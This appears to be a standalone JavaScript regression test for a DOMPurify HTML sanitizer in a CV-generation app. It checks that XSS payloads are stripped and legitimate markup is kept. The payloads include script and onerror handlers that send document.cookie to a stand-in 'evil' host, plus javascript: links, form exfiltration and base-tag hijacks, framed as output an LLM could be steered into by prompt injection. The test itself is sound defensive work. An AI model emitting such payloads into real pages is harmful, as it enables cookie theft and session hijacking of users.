// Security regression test for src/lib/sanitizeHtml.ts
//
// Run it:  npm i -D jsdom && node security-tests/sanitizeHtml.test.js
// Exits 0 when every payload is neutralised and every legitimate document
// construct survives; exits 1 otherwise.
//
// The project has no test runner, so this is a standalone script. It mirrors
// DOCUMENT_SANITIZE_CONFIG from src/lib/sanitizeHtml.ts rather than importing
// it (that file is TypeScript and 'use client'). KEEP THE TWO IN SYNC — if you
// change the allowlist there, change it here in the same commit.
const { JSDOM } = require('jsdom');
const createDOMPurify = require('dompurify');

const window = new JSDOM('').window;
const DOMPurify = createDOMPurify(window);

const GOOGLE_FONTS_PREFIX = 'https://fonts.googleapis.com/';

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  const el = node;
  if (el.tagName === 'A') {
    el.setAttribute('target', '_blank');
    el.setAttribute('rel', 'noopener noreferrer');
  }
  if (el.tagName === 'LINK') {
    const rel = (el.getAttribute('rel') || '').toLowerCase();
    const href = el.getAttribute('href') || '';
    if (rel !== 'stylesheet' || !href.startsWith(GOOGLE_FONTS_PREFIX)) {
      el.parentNode && el.parentNode.removeChild(el);
    }
  }
});

const DOCUMENT_SANITIZE_CONFIG = {
  ALLOWED_TAGS: [
    'div','span','p','br','hr','section','article','header','footer','main','aside','nav',
    'h1','h2','h3','h4','h5','h6',
    'strong','b','em','i','u','s','small','sub','sup','mark','abbr','cite','q',
    'ul','ol','li','dl','dt','dd','blockquote','pre','code',
    'table','thead','tbody','tfoot','tr','th','td','caption','colgroup','col',
    'a','img','link',
  ],
  ALLOWED_ATTR: [
    'style','class','id','href','src','alt','title','width','height',
    'colspan','rowspan','align','valign','border','cellpadding','cellspacing',
    'target','rel','type','dir','lang',
  ],
  ALLOW_DATA_ATTR: false,
  FORCE_BODY: true,
};

const sanitizeDocumentHtml = (html) =>
  html ? String(DOMPurify.sanitize(html, DOCUMENT_SANITIZE_CONFIG)) : '';

// ─── Attack payloads: what a prompt injection would steer the LLM into emitting ──
const attacks = [
  ['inline script tag',        '<div>CV</div><script>fetch("https://evil/?c="+document.cookie)</script>'],
  ['img onerror',              '<img src=x onerror="fetch(\'https://evil/?c=\'+document.cookie)">'],
  ['svg onload',               '<svg onload=alert(1)>'],
  ['iframe injection',         '<iframe src="https://evil/"></iframe>'],
  ['javascript: href',         '<a href="javascript:alert(1)">click</a>'],
  ['form exfiltration',        '<form action="https://evil/"><input name=pw></form>'],
  ['body onload',              '<body onload=alert(1)>x</body>'],
  ['object embed',             '<object data="https://evil/x.swf"></object>'],
  ['style tag exfil',          '<style>div{background:url("https://evil/leak")}</style>'],
  ['base tag hijack',          '<base href="https://evil/">'],
  ['foreign stylesheet link',  '<link rel="stylesheet" href="https://evil/x.css">'],
  ['meta refresh',             '<meta http-equiv="refresh" content="0;url=https://evil/">'],
  ['onmouseover attribute',    '<div onmouseover="alert(1)">hover</div>'],
  ['nested obfuscated script', '<div><scr<script>ipt>alert(1)</scr</script>ipt></div>'],
];

// Must survive: real CV/cover-letter markup
const legit = [
  ['inline-styled div',   '<div style="font-family:Arial;color:#1a1a2e;padding:40px">Jane Doe</div>'],
  ['ATS section ids',     '<h2 id="experience">Experience</h2><h3>Engineer</h3>'],
  ['table layout',        '<table><tr><td style="width:50%">A</td><td>B</td></tr></table>'],
  ['google fonts link',   '<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter">'],
  ['external link',       '<a href="https://linkedin.com/in/jane">LinkedIn</a>'],
];

let failed = 0;

console.log('=== BLOCKED (must contain no executable primitive) ===');
for (const [name, payload] of attacks) {
  const out = sanitizeDocumentHtml(payload);
  const bad = /<script|onerror|onload|onmouseover|javascript:|<iframe|<object|<form|<base|<meta|evil/i.test(out);
  if (bad) { failed++; console.log(`  FAIL  ${name}\n        -> ${out}`); }
  else     { console.log(`  ok    ${name}  -> ${JSON.stringify(out).slice(0, 70)}`); }
}

console.log('\n=== PRESERVED (legitimate document markup must survive) ===');
for (const [name, html] of legit) {
  const out = sanitizeDocumentHtml(html);
  const kept = out.length > 0;
  if (!kept) { failed++; console.log(`  FAIL  ${name} was stripped entirely`); }
  else       { console.log(`  ok    ${name}  -> ${JSON.stringify(out).slice(0, 90)}`); }
}

console.log(`\n${failed === 0 ? 'ALL CHECKS PASSED' : failed + ' CHECK(S) FAILED'}`);
process.exit(failed === 0 ? 0 : 1);
